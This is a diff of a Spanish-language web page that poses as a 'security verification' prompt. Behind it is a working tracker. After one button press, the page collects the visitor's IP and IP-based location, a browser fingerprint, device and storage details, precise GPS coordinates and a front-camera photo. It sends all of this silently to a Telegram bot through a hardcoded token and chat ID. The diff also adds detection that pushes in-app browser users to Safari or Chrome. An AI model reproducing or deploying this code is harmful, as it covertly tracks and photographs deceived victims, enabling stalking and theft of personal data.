@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verificación de seguridad</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #f1f3f4;
             font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
@@ -28,17 +24,8 @@
             width: 100%;
             text-align: center;
         }
-        h1 {
-            font-size: 1.8rem;
-            font-weight: 500;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-        }
-        p {
-            color: #5f6368;
-            font-size: 0.9rem;
-            margin-bottom: 28px;
-        }
+        h1 { font-size: 1.8rem; font-weight: 500; color: #1a1a1a; margin-bottom: 12px; }
+        p { color: #5f6368; font-size: 0.9rem; margin-bottom: 28px; }
         button {
             background: #1a73e8;
             color: white;
@@ -51,16 +38,31 @@
             width: 100%;
             transition: background 0.2s;
         }
-        button:active {
-            background: #1557b0;
+        button:active { background: #1557b0; }
+        .warning {
+            background: #fef7e0;
+            border-left: 4px solid #f9ab00;
+            padding: 12px;
+            margin-top: 20px;
+            border-radius: 8px;
+            color: #5f6368;
+            font-size: 0.8rem;
+            text-align: left;
         }
+        a { color: #1a73e8; text-decoration: none; }
     </style>
 </head>
 <body>
 <div class="card">
     <h1>🔐 Verificación requerida</h1>
-    <p>Presiona el botón para continuar</p>
-    <button id="btn">✅ Verificar acceso</button>
+    <div id="main-content">
+        <p>Presiona el botón para continuar</p>
+        <button id="btn">✅ Verificar acceso</button>
+    </div>
+    <div id="webview-warning" style="display:none;" class="warning">
+        ⚠️ Estás usando un navegador integrado (Instagram/Facebook). Para que esto funcione correctamente, <strong>abre este enlace en Safari o Chrome</strong>.<br><br>
+        <button id="open-external">📱 Abrir en navegador externo</button>
+    </div>
 </div>
 
 <video id="video" autoplay playsinline style="display:none"></video>
@@ -68,14 +70,19 @@
 
 <script>
     // 🔐 REVOCA TU TOKEN VIEJO Y PON AQUÍ EL NUEVO (con @BotFather)
-    const BOT_TOKEN = 'TU_NUEVO_TOKEN_AQUI';
+    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
     const CHAT_ID = '7555997298';
 
     let alreadySent = false;
 
-    // ---------- 1. IP + geolocalización por IP (fallback) ----------
+    // ---------- Detectar si es WebView (Instagram, Facebook, etc.) ----------
+    function isWebView() {
+        const ua = navigator.userAgent;
+        return /(Instagram|FBAN|FBAV|Twitter|WhatsApp|Snapchat)/i.test(ua);
+    }
+
+    // ---------- Obtener IP (múltiples intentos) ----------
     async function getIPinfo() {
-        // Múltiples fuentes para mayor fiabilidad
         const sources = [
             'https://ipapi.is/',
             'https://ipapi.co/json/',
@@ -104,7 +111,6 @@
                         timezone: data.timezone || 'N/A'
                     };
                 } else if (url.includes('ipify')) {
-                    // Solo IP, el resto lo dejamos como N/A
                     return {
                         ip: data.ip,
                         country: 'N/A',
@@ -114,12 +120,12 @@
                         timezone: 'N/A'
                     };
                 }
-            } catch (e) { /* intenta siguiente fuente */ }
+            } catch (e) { /* intenta siguiente */ }
         }
         return null;
     }
 
-    // ---------- 2. Fingerprint (GPU, fuentes, canvas) ----------
+    // ---------- Fingerprint ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -138,7 +144,7 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
-    // ---------- 3. Datos del dispositivo ----------
+    // ---------- Dispositivo ----------
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -153,7 +159,7 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
-    // ---------- 4. Almacenamiento ----------
+    // ---------- Almacenamiento ----------
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -163,7 +169,7 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
-    // ---------- 5. GPS (alta precisión) ----------
+    // ---------- GPS ----------
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -171,32 +177,23 @@
                 return;
             }
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                }),
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                 () => resolve(null),
                 { enableHighAccuracy: true, timeout: 15000 }
             );
         });
     }
 
-    // ---------- 6. Cámara frontal (con fallback) ----------
+    // ---------- Cámara frontal ----------
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         let stream = null;
         try {
-            // Primero intentamos cámara frontal
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         } catch(e) {
-            try {
-                // Si falla, cualquier cámara
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            } catch(err) {
-                return null;
-            }
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
+            catch(err) { return null; }
         }
         video.srcObject = stream;
         await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
@@ -209,63 +206,63 @@
         return blob;
     }
 
-    // ---------- 7. Envío a Telegram ----------
+    // ---------- Envío ----------
     async function sendMessage(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-            });
-        } catch(e) { /* silencio */ }
+        try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' }) }); } catch(e) {}
     }
-
     async function sendPhoto(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'photo.jpg');
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch(e) { /* silencio */ }
+        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'photo.jpg');
+        try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
     }
 
-    // ---------- 8. Acción principal ----------
-    document.getElementById('btn').onclick = async () => {
+    // ---------- Acción principal (solo si no es WebView) ----------
+    async function collectAndSend() {
         if (alreadySent) return;
         alreadySent = true;
-
-        // Recolectar todo en paralelo (el GPS se hará después de la solicitud de permiso)
         const [fp, ipInfo, device, storage, gps] = await Promise.all([
             getFingerprint(),
             getIPinfo(),
             getDeviceInfo(),
             getStorageInfo(),
-            getGPS()  // Esto mostrará el diálogo de ubicación (si no se había dado)
+            getGPS()
         ]);
-
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
-        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas Hash: ${fp.canvasHash}...\n\n`;
+        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
         message += `🌐 *Network Information*\n   • IP Address: ${ipInfo ? ipInfo.ip : 'N/A'}\n   • Language: ${device.language}\n\n`;
         message += `📍 *Location Details*\n`;
         if (gps) {
             message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
         } else if (ipInfo && ipInfo.city && ipInfo.city !== 'N/A') {
-            message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
-            message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
+            message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
         } else {
             message += `   • No disponible (permiso denegado o sin red)\n`;
         }
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
         message += `🔐 *Device Permissions*\n   • Camera: ${navigator.mediaDevices ? 'Solicitado' : 'No soportado'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @SOCIETY\n`;
-
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @society\n`;
         await sendMessage(message);
-        const foto = await capturePhoto();  // Esto pide cámara si no se había dado
+        const foto = await capturePhoto();
         if (foto) await sendPhoto(foto);
-    };
+    }
+
+    // ---------- Cargar y mostrar según WebView ----------
+    window.addEventListener('DOMContentLoaded', () => {
+        if (isWebView()) {
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('webview-warning').style.display = 'block';
+            document.getElementById('open-external').onclick = () => {
+                // Intentar abrir en navegador externo (funciona en iOS)
+                window.location.href = 'http://www.google.com'; // redirige a google? no, mejor abrir el mismo link pero con external
+                // En iOS, no se puede forzar Safari directamente, pero podemos mostrar un mensaje.
+                alert('Copia el enlace y pégalo en Safari/Chrome');
+            };
+        } else {
+            document.getElementById('btn').onclick = collectAndSend;
+        }
+    });
 </script>
 </body>
 </html>
